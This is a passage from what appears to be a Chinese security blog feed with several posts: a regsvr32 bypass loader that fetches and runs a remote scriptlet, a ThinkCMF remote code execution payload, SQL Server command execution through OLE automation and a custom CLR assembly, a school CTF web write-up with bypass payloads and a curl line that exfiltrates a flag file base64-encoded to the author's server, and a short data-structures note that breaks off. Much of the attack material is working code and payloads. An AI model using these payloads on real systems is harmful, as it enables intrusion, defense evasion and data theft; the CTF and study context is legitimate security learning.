      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>regsvr32为白名单，但是面对各种杀软和defender。早已被拦截，虽然可以命令行绕过，但是在看到某文章后决定复现一波<br>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247486668&amp;idx=1&amp;sn=b490c44dd870307a574818fd2d56e4a3&amp;chksm=fb183ffecc6fb6e80f6ff64781325ebdfc8edc14462b2c6921213dcb72845dc243a2dc6f5176" target="_blank" rel="noopener">regsvr32绕过</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>regsvr32远程下载是调用scrobj.dll里的DllInstall函数实现的下载<br><img src="https://s3.ax1x.com/2021/01/20/sRKxoV.png" alt=""></p><p>IDA分析<br><img src="https://s3.ax1x.com/2021/01/20/sRMSiT.md.png" alt=""></p><p>API Monitor跟踪这个dll<br><img src="https://s3.ax1x.com/2021/01/20/sRM9WF.png" alt=""></p><p>搜索API关键名称CreateURLMonikerEx，找到函数位置<br><img src="https://s3.ax1x.com/2021/01/20/sRMiQJ.png" alt=""></p><p>搜索该函数调用点在sub_1800072D0，符合DllInstall函数调用<br><img src="https://s3.ax1x.com/2021/01/20/sRMZo6.png" alt=""></p><p>调用该函数实现regsvr32实现功能</p><pre><code class="C">#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#define error_print(name){printf(&quot;%s,Error Code:%d&quot;,GetLastError());exit(1);}int main(){        LPCSTR dllpath = &quot;c:\\windows\\system32\\scrobj.dll&quot;;        HMODULE load = LoadLibraryA(dllpath);        if (load == NULL) {               error_print(&quot;LoadLibraryA&quot;);        }        FARPROC getmodule = GetProcAddress(load, &quot;DllInstall&quot;);        if (getmodule == NULL) {               error_print(&quot;GetProcAddress&quot;);        }        ((void(*)(BOOL, TCHAR*))getmodule)(FALSE, L&quot;http://192.168.137.227/testx.txt&quot;); //指针函数调用    return 0;}</code></pre><p>testx.txt</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;&lt;component id=&quot;TESTING&quot;&gt;&lt;registration  progid=&quot;TESTING&quot;  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;  &lt;script language=&quot;JScript&quot;&gt;    &lt;![CDATA[      var wsc = &quot;WScript.Shell&quot;;      var com = &quot;calc&quot;;      com.concat(&quot;.&quot;,&quot;e&quot;,&quot;x&quot;,&quot;e&quot;);      var foo = new ActiveXObject(wsc).Run(com);    ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/component&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/20/sRMQQH.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ThinkCMF任意包含漏洞复现</title>
      <link href="/posts/3656eb8c.html"/>
      <url>/posts/3656eb8c.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>根据ThinkPHP框架约定可以通过a参数来指定对应的函数名，但是该函数的修饰符必须为Public, 而添加的代码正好符合该条件。 可以通过如下URL进行访问，并且可以添加GET参数arg1传递给函数。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞出在：application\Portal\Controller\IndexController.class.php<br>首先引用Common\Controller\HomebaseController控制类文件，然后调用display函数<br><img src="https://s3.ax1x.com/2021/01/09/sMq958.png" alt=""></p><p>跟入display函数看描述就是可以自定义加载模版，通过$this-&gt;parseTemplate 函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。<br><img src="https://s3.ax1x.com/2021/01/09/sMqZbq.png" alt=""></p><pre><code class="php">public function parseTemplate($template=&#39;&#39;) {   $tmpl_path=C(&quot;SP_TMPL_PATH&quot;); // 前台模板文件根目录 themes/   define(&quot;SP_TMPL_PATH&quot;, $tmpl_path);   if($this-&gt;theme) { // 指定模板主题       $theme = $this-&gt;theme;   }else{       // 获取当前主题名称       $theme      =    C(&#39;SP_DEFAULT_THEME&#39;); // 前台模板文件 simplebootx       if(C(&#39;TMPL_DETECT_THEME&#39;)) {// 自动侦测模板主题           $t = C(&#39;VAR_TEMPLATE&#39;); //默认模板切换变量 t           if (isset($_GET[$t])){               $theme = $_GET[$t];           }elseif(cookie(&#39;think_template&#39;)){               $theme = cookie(&#39;think_template&#39;);           }           if(!file_exists($tmpl_path.&quot;/&quot;.$theme)){ //判断前台模板文件是否存在               $theme  =   C(&#39;SP_DEFAULT_THEME&#39;);           }           cookie(&#39;think_template&#39;,$theme,864000);       }   }   $theme_suffix=&quot;&quot;;   if(C(&#39;MOBILE_TPL_ENABLED&#39;) &amp;&amp; sp_is_mobile()){//开启手机模板支持       if (C(&#39;LANG_SWITCH_ON&#39;,null,false)){           if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile_&quot;.LANG_SET)){//优先级最高               $theme_suffix  =  &quot;_mobile_&quot;.LANG_SET;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){               $theme_suffix  =  &quot;_mobile&quot;;           }elseif (file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_&quot;.LANG_SET)){               $theme_suffix  =  &quot;_&quot;.LANG_SET;           }       }else{              if(file_exists($tmpl_path.&quot;/&quot;.$theme.&quot;_mobile&quot;)){                  $theme_suffix  =  &quot;_mobile&quot;;              }       }   }else{       $lang_suffix=&quot;_&quot;.LANG_SET;       if (C(&#39;LANG_SWITCH_ON&#39;,null,false) &amp;&amp; file_exists($tmpl_path.&quot;/&quot;.$theme.$lang_suffix)){           $theme_suffix = $lang_suffix;       }   }   $theme=$theme.$theme_suffix; //定义当前语言   C(&#39;SP_DEFAULT_THEME&#39;,$theme);   $current_tmpl_path=$tmpl_path.$theme.&quot;/&quot;;   // 获取当前主题的模版路径   define(&#39;THEME_PATH&#39;, $current_tmpl_path);   $cdn_settings=sp_get_option(&#39;cdn_settings&#39;);   if(!empty($cdn_settings[&#39;cdn_static_root&#39;])){       $cdn_static_root=rtrim($cdn_settings[&#39;cdn_static_root&#39;],&#39;/&#39;);       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,$cdn_static_root.&quot;/&quot;.$current_tmpl_path);       C(&quot;TMPL_PARSE_STRING.__PUBLIC__&quot;,$cdn_static_root.&quot;/public&quot;);       C(&quot;TMPL_PARSE_STRING.__WEB_ROOT__&quot;,$cdn_static_root);   }else{       C(&quot;TMPL_PARSE_STRING.__TMPL__&quot;,__ROOT__.&quot;/&quot;.$current_tmpl_path);   }   C(&#39;SP_VIEW_PATH&#39;,$tmpl_path);   C(&#39;DEFAULT_THEME&#39;,$theme);   define(&quot;SP_CURRENT_THEME&quot;, $theme);   if(is_file($template)) {      return $template;   }   $depr       =   C(&#39;TMPL_FILE_DEPR&#39;);   $template   =   str_replace(&#39;:&#39;, $depr, $template);   // 获取当前模块   $module   =  MODULE_NAME;   if(strpos($template,&#39;@&#39;)){ // 跨模块调用模版文件      list($module,$template)  =   explode(&#39;@&#39;,$template);   }   $module =$module.&quot;/&quot;;   // 分析模板文件规则   if(&#39;&#39; == $template) {      // 如果模板文件名为空 按照默认规则定位      $template = CONTROLLER_NAME . $depr . ACTION_NAME;   }elseif(false === strpos($template, &#39;/&#39;)){      $template = CONTROLLER_NAME . $depr . $template;   }   $file = sp_add_template_file_suffix($current_tmpl_path.$module.$template);   $file= str_replace(&quot;//&quot;,&#39;/&#39;,$file);   if(!file_exists_case($file)) E(L(&#39;_TEMPLATE_NOT_EXIST_&#39;).&#39;:&#39;.$file);   return $file;}</code></pre><p>由于parseTemplate函数为模板渲染函数，而该函数权限为public。导致可控，最终payload如下：<br>/?a=fetch&amp;templateFile=public/index&amp;prefix=’’&amp;content=<php>file_put_contents(‘test.php’,’&lt;?php phpinfo(); ?&gt;’)</php><br><img src="https://s3.ax1x.com/2021/01/09/sMqMPU.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/09/sMq8M9.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/ch459742906/p/5949168.html" target="_blank" rel="noopener">https://www.cnblogs.com/ch459742906/p/5949168.html</a><br><a href="https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3d7YrTq0vFSKXV6u0Hjnnw</a><br><a href="https://www.cnblogs.com/0daybug/p/11720575.html" target="_blank" rel="noopener">https://www.cnblogs.com/0daybug/p/11720575.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sql server没xp_cmdshell执行命令</title>
      <link href="/posts/639a5410.html"/>
      <url>/posts/639a5410.html</url>
      <content type="html"><![CDATA[<h2 id="利用COM执行命令"><a href="#利用COM执行命令" class="headerlink" title="利用COM执行命令"></a>利用COM执行命令</h2><p>（需要开启Ole Automation Procedures组件）</p><pre><code>declare @luan int,@exec int,@text int,@str varchar(8000);exec sp_oacreate &#39;{72C24DD5-D70A-438B-8A42-98424B88AFB8}&#39;,@luan output;exec sp_oamethod @luan,&#39;exec&#39;,@exec output,&#39;C:\\Windows\\System32\\cmd.exe /c whoami&#39;;exec sp_oamethod @exec, &#39;StdOut&#39;, @text out;exec sp_oamethod @text, &#39;readall&#39;, @str out;select @str;</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs3hd.png" alt=""></p><p>没有开启Ole Automation Procedures，可以用下面的命令开启</p><pre><code>sp_configure &#39;show advanced options&#39;, 1;GORECONFIGURE;GOsp_configure &#39;Ole Automation Procedures&#39;, 1;GORECONFIGURE;GO</code></pre><h2 id="编写CLR实现执行命令"><a href="#编写CLR实现执行命令" class="headerlink" title="编写CLR实现执行命令"></a>编写CLR实现执行命令</h2><p>编写语言：C#<br>Vs创建类库</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System;using System.Threading.Tasks;namespace shellexec{    public class exec    {        public static string cmd(string command)        {            System.Diagnostics.Process pro = new System.Diagnostics.Process();            pro.StartInfo.FileName = &quot;cmd.exe&quot;;            pro.StartInfo.UseShellExecute = false;            pro.StartInfo.RedirectStandardError = true; //标准错误            pro.StartInfo.RedirectStandardInput = true; //标准输入            pro.StartInfo.RedirectStandardOutput = true; //标准输出            pro.StartInfo.CreateNoWindow = true; //是否在新窗口开启进程            pro.Start();            pro.StandardInput.WriteLine(command + &quot;&amp;&amp;exit&quot;); //命令参数写入            pro.StandardInput.AutoFlush = true; //缓冲区自动刷新            string output = pro.StandardOutput.ReadToEnd(); //读取执行结果            pro.WaitForExit(); //等待执行完成退出            pro.Close();            return output.ToString();        }    }}</code></pre><p>生成dll后，可以用hex的方法写到目标，或者shell上传。然后开始构造<br>1.目标数据库实例需要启用clr集成</p><pre><code>exec sp_configure &#39;clr enabled&#39;, 1;--在SQL Server中启用CLRreconfigure;go</code></pre><p>2.目标数据库的可信任属性需要设为false,可以使用以下语句启用</p><pre><code>ALTER DATABASE [&lt;数据库名称&gt;] SET TRUSTWORTHY ON</code></pre><p>3.在数据库中注册DLL</p><pre><code>CREATE ASSEMBLY MySqlCLR FROM &#39;&lt;dll的路径&gt;&#39; //MySqlCLR为导入dll后的变量名称</code></pre><p>4.创建函数<br>（根据对应函数的类型的参数构造对应的参数类型，然后RETURNS [nvarchar] (max)记得设置为返回最大如果是返回string类型的话），在直接这个dll的名称在那个命名空间、类、函数）</p><pre><code>CREATE FUNCTION [dbo].[cmd2]  (      @cmd AS NVARCHAR(max))  RETURNS [nvarchar] (max) WITH EXECUTE AS CALLERAS  EXTERNAL NAME [MySqlCLR].[shellexec.exec].cmd //shellexec为命名空间，exec为类名，cmd为函数名GO</code></pre><p>5.程序集的权限级别必须设为 external access,否则在部署的时候会报错</p><pre><code>ALTER ASSEMBLY [MySqlCLR]WITH PERMISSION_SET = UNSAFE</code></pre><p>6.调用存储过程和函数方法</p><pre><code>select [dbo].[cmd2](&#39;whoami&#39;)</code></pre><p><img src="https://s3.ax1x.com/2021/01/07/sZs6cq.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/07/sZsWHU.png" alt=""></p><p>参考链接：<br><a href="https://blog.csdn.net/catchme_439/article/details/78411009" target="_blank" rel="noopener">https://blog.csdn.net/catchme_439/article/details/78411009</a><br><a href="https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/33322584?from_voters_page=true</a></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>学校ctf部分wp</title>
      <link href="/posts/81eaad2f.html"/>
      <url>/posts/81eaad2f.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1390440146&auto=1&height=66"></iframe><p><strong>主要是web题的wp</strong></p><h2 id="flag给你"><a href="#flag给你" class="headerlink" title="flag给你"></a>flag给你</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPMH1S.png" alt=""></p><p>访问链接得到flag，给出的flag少了一个-。加上去即可<br><img src="https://s3.ax1x.com/2021/01/04/sPMX0s.png" alt=""></p><pre><code>flag{091efg59-258e-3abv-c3h7-f18769f21b59}</code></pre><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>给出一段code</p><pre><code class="php">&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = $_GET[&#39;str&#39;];if (unserialize($str) === &quot;$key&quot;){    echo $flag;}show_source(__FILE__);?&gt;</code></pre><p>序列化code如下</p><pre><code class="php">&lt;?phperror_reporting(0);//include &quot;flag.php&quot;;$key = &quot;abcdefg!!!&quot;;$str = &quot;abcdefg!!!&quot;;echo serialize($str);?&gt;</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPlk28.png" alt=""></p><h2 id="你猜"><a href="#你猜" class="headerlink" title="你猜"></a>你猜</h2><p>Ctrl+U得到注释的code<br><img src="https://s3.ax1x.com/2021/01/04/sPlVKg.png" alt=""></p><pre><code class="php">&lt;?phpsession_start();$_SESSION[&#39;pwd&#39;]=time();if (isset ($_POST[&#39;password&#39;])) {    if ($_POST[&#39;pwd&#39;] == $_SESSION[&#39;pwd&#39;])        die(&#39;Flag:&#39;.$flag);    else{        print &#39;&lt;p&gt;猜测错误.&lt;/p&gt;&#39;;        $_SESSION[&#39;pwd&#39;]=time().time();    }}?&gt;</code></pre><p>session ID是我们可控的，pwd也是我们可控的，唯一就是session我们无法控制是多少，但是可以置为空<br>删除PHPSESSID即可<br><img src="https://s3.ax1x.com/2021/01/04/sP1tl8.png" alt=""></p><h2 id="flag在那里"><a href="#flag在那里" class="headerlink" title="flag在那里"></a>flag在那里</h2><p>打开一个lnk，点开跳转到404<br><img src="https://s3.ax1x.com/2021/01/04/sP12XF.png" alt=""></p><p>抓包发现把flag base64编码放在了请求头<br><img src="https://s3.ax1x.com/2021/01/04/sP15kR.png" alt=""></p><pre><code>ctf{f31a81e91afdcf0b84dfee82ec2fb196}</code></pre><h2 id="不想和你说话"><a href="#不想和你说话" class="headerlink" title="不想和你说话"></a>不想和你说话</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP17p6.png" alt=""></p><p>典型的变量覆盖，把b覆盖为空。a参数为空，非===达到若判断，””==False<br><img src="https://s3.ax1x.com/2021/01/04/sP3YNR.png" alt=""></p><h2 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h2><p>没什么好说的，访问shell.php。密码为hack，得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sP34KS.png" alt=""></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p><img src="https://s3.ax1x.com/2021/01/04/sP3H5n.png" alt=""></p><p>查看js，访问data.php。然后解析json显示<br><img src="https://s3.ax1x.com/2021/01/04/sP3XvT.png" alt=""></p><p>拿原题的脚本跑即可得到flag</p><pre><code class="python">import asyncioimport timeimport aiohttpimport jsoncalc=0class test(object):    async def crackpassword(self,number):        global calc        if calc &gt; 0:            print(calc)            exit()        async with number:            async with aiohttp.ClientSession(headers={&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&quot;}) as session:                async with session.get(url=&quot;http://10.20.105.228:8811/data.php&quot;) as response:                    jsons=json.loads(await response.text())                    if jsons[&#39;angle&#39;]&gt;=150 and jsons[&#39;angle&#39;]&lt;=210:                        print(jsons[&#39;flag&#39;])                        calc+=1    async def run(self):        number=asyncio.Semaphore(500)        data=[self.crackpassword(number) for k in range(500)]        await asyncio.wait(data)if __name__ == &#39;__main__&#39;:    obj=test()    loop=asyncio.get_event_loop()    loop.run_until_complete(obj.run())    loop.close()</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sP8oQK.png" alt=""></p><h2 id="easygame"><a href="#easygame" class="headerlink" title="easygame"></a>easygame</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPGuOU.png" alt=""></p><p>根据GET请求得到下一个请求<br><img src="https://s3.ax1x.com/2021/01/04/sPGN6K.png" alt=""></p><p>请求告知不是admin<br><img src="https://s3.ax1x.com/2021/01/04/sPG0TH.png" alt=""></p><p>带上X-Forwarded-For头设为127.0.0.1即可得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPGrtA.png" alt=""></p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>打开url，点击lnk下载flag.txt告知flag不在此。注释看到flag.php<br><img src="https://s3.ax1x.com/2021/01/04/sPGf0g.png" alt=""></p><p>下载flag.php得到code</p><pre><code class="php">&lt;?phpheader(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码function encrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= $key {$x};        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );    }    return base64_encode ( $str );}function decrypt($data, $key) {    $key = md5 ( $key );    $x = 0;    $data = base64_decode ( $data );    $len = strlen ( $data );    $l = strlen ( $key );    for($i = 0; $i &lt; $len; $i ++) {        if ($x == $l) {            $x = 0;        }        $char .= substr ( $key, $x, 1 );        $x ++;    }    for($i = 0; $i &lt; $len; $i ++) {        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );        } else {            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );        }    }    return $str;}$key=&quot;ctf&quot;;$flag=&quot;xWqammfJaWrGm5yayJttaGiTlJRsbGrMmWxqa2fMm50=&quot;;//encrypt($flag,$key)?&gt;</code></pre><p>调用decrypt函数解码得到flag<br><img src="https://s3.ax1x.com/2021/01/04/sPJWgx.png" alt=""></p><pre><code>ctf{d2686e18b9ebc793613d448f73563f8d}</code></pre><h2 id="你算的太慢"><a href="#你算的太慢" class="headerlink" title="你算的太慢"></a>你算的太慢</h2><p><img src="https://s3.ax1x.com/2021/01/04/sPYGM6.png" alt=""></p><p>实验吧原题，直接拿py带session计算重发即可得到flag</p><h2 id="sha"><a href="#sha" class="headerlink" title="sha"></a>sha</h2><p>view得到code</p><pre><code class="php">if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))      die(&#39;Flag: &#39;.$flag);    else        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;}else{    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;</code></pre><p>数组请求绕过判断，然后不使得判断成立得到flag</p><pre><code>http://10.20.105.228:8812/?name[]=&amp;password[]=admin</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPYzS1.png" alt=""></p><h2 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h2><p>找不到切入点，跳过</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>RCE空格绕过</p><pre><code class="php">&lt;?phpif(isset($_REQUEST[ &#39;ip&#39; ])) {    $target = trim($_REQUEST[ &#39;ip&#39; ]);    $substitutions = array(        &#39;head&#39; =&gt; &#39;&#39;,        &#39;ls&#39; =&gt; &#39;&#39;,        &#39;cat&#39; =&gt; &#39;&#39;,        &#39;flag&#39; =&gt; &#39;&#39;,        &#39;&lt;&#39;  =&gt; &#39;&#39;,        &#39; &#39;  =&gt; &#39;&#39;,        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );        echo $target;    echo  &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}show_source(__FILE__);?&gt;</code></pre><p>变量拼接绕过</p><pre><code>http://10.20.105.228:8815/?ip=127.0.0.1;a=c;b=at;$a$b${IFS}*</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPtWnK.png" alt=""></p><h2 id="不难的"><a href="#不难的" class="headerlink" title="不难的"></a>不难的</h2><pre><code class="php">&lt;?php  include(&#39;hint.php&#39;);$data = $_GET[&quot;data&quot;];if(isset($data)&amp;&amp;(file_get_contents($data,&#39;r&#39;)===&quot;Welcome to jmpt CTF&quot;)){    echo $hint;}if(isset($_GET[&#39;file&#39;])){      $file = $_GET[&#39;file&#39;];      $content = $_POST[&#39;content&#39;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);      $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);      file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;a，各位师傅太能秀了！&#39;);?&gt;&quot;.$content);  }else{      highlight_file(__FILE__);  }?&gt;</code></pre><p>死亡exit绕过，p神有细说。<br>url双重编码绕过文件名过滤<br>rot13绕过即可（开启了短标签，rot13不会被解码写入，直接不编码即可）<br><img src="https://s3.ax1x.com/2021/01/04/sPN8HO.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/04/sPNdgI.png" alt=""></p><h2 id="qiongqiong"><a href="#qiongqiong" class="headerlink" title="qiongqiong"></a>qiongqiong</h2><pre><code class="php">&lt;?phpshow_source(__FILE__);if(isset($_GET[&#39;a&#39;])){    $feiyu=$_GET[&#39;a&#39;];    highlight_file(__FILE__);        if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$feiyu)){            die(&quot;No1 Die&quot;);        }        if(preg_match(&quot;/\~|\!|\@|#\|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$feiyu)){            die(&quot;No2 Die&quot;);        }        eval($feiyu);}?&gt;</code></pre><p>wfuzz得到没被过滤的几个字符<br><img src="https://s3.ax1x.com/2021/01/04/sPNvKx.png" alt=""></p><p>搜索得到该题为php临时文件shell<br><img src="https://s3.ax1x.com/2021/01/04/sPUCIe.png" alt=""></p><h2 id="满意的数字"><a href="#满意的数字" class="headerlink" title="满意的数字"></a>满意的数字</h2><p>访问index.php.txt得到code</p><pre><code class="php">&lt;?phpheader ( &#39;Content-Type: text/html; charset=utf-8&#39; ); // 网页编码error_reporting ( 0 );$flag = &quot;*******************&quot;;//echo $_POST[&#39;num&#39;];if (isset ( $_POST [&#39;num&#39;] )) {    if (@ereg ( &quot;^[1-9]+$&quot;, $_POST[&#39;num&#39;] ) === FALSE)        echo &#39;说好的数字呢？&#39;;    else if (strpos ( $_POST[&#39;num&#39;], &#39;#testaasafd&#39; ) !== FALSE)        die ( &#39;Flag: &#39; . $flag );    else        echo &#39;你的数字不太符合我的心意哦！&#39;;}?&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;猜密码&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;text-align: center&quot;&gt;&lt;center&gt;&lt;img src=&quot;num.png&quot;/&gt;    &lt;form action=&quot;index.php&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;text&quot; name=&quot;num&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;    &lt;/form&gt;&lt;/center&gt;    &lt;!-- index.php.txt  --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>数组绕过解决<br><img src="https://s3.ax1x.com/2021/01/04/sPU3zn.png" alt=""></p><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><pre><code class="php">&lt;?phphighlight_file(&#39;source.txt&#39;);echo &quot;&lt;br&gt;&lt;br&gt;&quot;;$flag = &#39;xxxxxxxx&#39;;$msg_giveme = &#39;Give me the flag!&#39;;$msg_getout = &#39;No this. Get out!&#39;;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){    exit($msg_giveme);}if($_POST[&#39;flag&#39;] === &#39;flag&#39; || $_GET[&#39;flag&#39;] === &#39;flag&#39;){    exit($msg_getout);}foreach ($_POST as $key =&gt; $value) {    $$key = $value;}foreach ($_GET as $key =&gt; $value) {    $$key = $$value;}echo &#39;the flag is : &#39; . $flag;?&gt;</code></pre><p>变量覆盖，原本是要flag=flag才能得到真正的flag，但是被if过滤了，多个变量暂存即可绕过</p><pre><code>http://10.20.105.228:8809/?123=flag&amp;flag=123</code></pre><p><img src="https://s3.ax1x.com/2021/01/04/sPUoQI.png" alt=""></p><h2 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag.phpif($c = @$_GET[&#39;c&#39;]){    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $c)){        eval(substr($c,0,5));    }else{        die(&quot;5个字母够了呀!&quot;);    }}</code></pre><p>搜索得知``为shell_exec缩写<br>此时将如上payload传到eval将变成如下<br><code>eval(</code>$c<code>;&lt;command&gt;)</code></p><p>看了一下wp，什么bp自带的客户端的dnslog数据外带，尝试用ceye.io数据外带。不是请求不到就是数据返回不全<br>最后想到的解决方法是，在服务器上<br><code>python3 -m http.server 4444</code></p><p>然后payload为<br><code>http://81.70.105.149:8006/?c=\</code>$c`;curl%20http://<ip>:4444/<code>cat${IFS}flag_i5_fun.php|grep${IFS}flag|base64</code><br><img src="https://s3.ax1x.com/2021/01/04/sPaAkF.png" alt=""></ip></p>]]></content>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构实现数组</title>
      <link href="/posts/57421f1d.html"/>
      <url>/posts/57421f1d.html</url>
      <content type="html"><![CDATA[<p>昨天在交流的时候发现数据结构还是有必要看一下，注意:是数据结构和算法的数据结构。不是基础的数据结构<br>目前需要学习的数据结构有：</p><pre><code>* 抽象数据类型 ADT，面向对象编程* 数组和列表* 链表，高级链表。双链表，循环双端链表* 队列，双端队列，循环双端队列* 栈，栈溢出* 算法分析，时间复杂度 大O 表示法* 哈希表，散列冲突* 字典* 集合* 递归* 查找：线性查找和二分查找* 基本排序算法* 高级排序算法: 归并排序、堆排序、快排* 树，二叉树* 图，dfs 和 bfs* python 内置常用数据结构和算法的使用。list, dict, set, collections 模块，heapq 模块* 面试笔试常考算法</code></pre><h2 id="数据和列表的区别"><a href="#数据和列表的区别" class="headerlink" title="数据和列表的区别"></a>数据和列表的区别</h2><p>数组：<br>数组是一个容器，它可以容纳一定数量的项目，这些项目是相同的类型。 大部分数据结构都使用数组来实现它们的算法。 以下是理解数组(Array)概念的重要术语。<br>元素 - 存储在数组中的每个项目称为元素。索引 - 数组中元素的每个位置都有一个数字索引，用于标识元素。//原文出自【易百教程】，商业转载请联系作者获得授权，非商业请保留原文链接：<a href="https://www.yiibai.com/python/py_data_structure/python_arrays.html" target="_blank" rel="noopener">https://www.yiibai.com/python/py_data_structure/python_arrays.html</a></p><p>列表：<br>列表是Python中最通用的数据类型，可以写成方括号之间的逗号分隔值(项目)列表。 使用列表的重要事项是，列表中的项目不必是相同的类型。也就是说一个列表中的项目(元素)可以是数字，字符串，数组，字典等甚至是列表类型。</p><p>数组和列表的区别为：数组只能放一个类型的数据，列表能放不同类型的数据</p><h2 